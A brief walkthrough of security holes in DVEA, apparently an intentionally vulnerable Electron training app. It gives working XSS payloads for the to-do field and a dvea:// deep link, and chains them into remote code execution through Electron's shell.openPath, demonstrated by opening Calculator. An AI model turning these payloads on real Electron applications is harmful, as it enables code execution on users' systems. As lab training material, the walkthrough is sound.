Here's the brief walkthrough of security vulnerabilities in DVEA:

# Cross-site Scripting

A simple XSS payload of `<img src=1 onerror='alert("DVEA")'/>` will do perform XSS on the application when put in the to-do item section

# XSS to RCE

To perform RCE via XSS, you need to import "shell" library and execute its `openPath` function using which you can execute commands on the system

```
<a onmouseover="
try{
const  {shell}=require('electron');
shell.openPath('/System/Applications/Calculator.app/')
}catch(e){
    console.error(e)
}">Hover Me</a>
```

# Deep-link to XSS

The app is registered with a deep-link of `dvea://` which is used to add tasks to the app using deep link e.g. `dvea://task?add=Clean Your Room` which obviously can be fed with an XSS payload like `dvea://task?add=<img src=1 onerror="alert('Deep link XSS')"/>` when opened via browser.

# Deep-link to RCE

Now combining all the above attack vectors we can chain the deep link to achieve RCE using the same payload as in "XSS to RCE" when invoked via the deep link.
